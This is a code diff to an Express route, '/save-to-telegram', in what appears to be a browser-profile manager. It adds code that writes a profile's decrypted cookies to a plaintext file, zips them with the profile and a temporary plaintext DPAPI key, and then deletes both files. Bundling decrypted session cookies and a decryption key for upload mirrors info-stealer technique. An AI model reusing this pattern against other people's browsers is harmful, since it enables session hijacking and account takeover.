@@ -1094,6 +1094,19 @@ router.post('/save-to-telegram', async (req, res) => {
           }
         }
 
+        // Also export decrypted cookies to cookies.json temporarily before zipping
+        let tempCookiesCreated = false;
+        try {
+          const cookieService = require('../services/cookieService');
+          const decryptedCookies = cookieService.exportAllCookies(p.id);
+          if (decryptedCookies && decryptedCookies.length > 0) {
+            fs.writeFileSync(path.join(profileDir, 'cookies.json'), JSON.stringify(decryptedCookies, null, 2), 'utf8');
+            tempCookiesCreated = true;
+          }
+        } catch (cookieErr) {
+          console.error('[Cookie Export] Failed to export decrypted cookies:', cookieErr.message);
+        }
+
         const zip = new AdmZip();
         
         // Exclude Cache, Code Cache, GPUCache, Service Worker to keep the zip size small
@@ -1126,10 +1139,15 @@ router.post('/save-to-telegram', async (req, res) => {
 
         const zipBuffer = zip.toBuffer();
 
-        // Delete the temporary plaintext key from disk immediately after zipping
+        // Delete the temporary plaintext key and cookies from disk immediately after zipping
         if (tempKeyCreated) {
           try {
             fs.unlinkSync(path.join(profileDir, 'dpapi_key.txt'));
+          } catch (e) {}
+        }
+        if (tempCookiesCreated) {
+          try {
+            fs.unlinkSync(path.join(profileDir, 'cookies.json'));
           } catch (e) {}
         }
 
